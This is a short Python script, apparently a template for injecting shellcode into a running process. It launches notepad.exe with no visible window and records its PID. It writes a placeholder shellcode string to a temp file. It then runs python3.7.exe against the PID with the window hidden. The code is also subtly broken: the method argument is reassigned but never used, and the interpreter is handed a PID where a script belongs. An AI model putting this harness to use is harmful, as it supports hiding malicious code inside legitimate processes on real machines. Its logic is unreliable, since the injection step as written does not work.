


def main(method):
    import subprocess
    import time
    try:
        process = subprocess.Popen(
            ["notepad.exe"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        time.sleep(1)
        notepad_pid = process.pid
        print(f"Notepad PID: {notepad_pid}")

        c = "TO_REPLACE_WITH_SHELLCODE"
        with open("C:\\Temp\\05ft8_2lthb4\\tmp_key", "wb") as f:
            f.write(c.encode())

        method = "L$ L" if method == "local" else method

        p = subprocess.run(
            ["python3.7.exe", str(notepad_pid)],
            text=True,
            capture_output=True,
            check=False,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        return p.stdout, p.stderr
    except Exception as e:
        print(f"Error: {e}")
        return "", str(e)


stdout, stderr = main("TO_REPLACE_WITH_METHOD")
print(f"STDOUT:\n{stdout}")
print(f"STDERR:\n{stderr}")
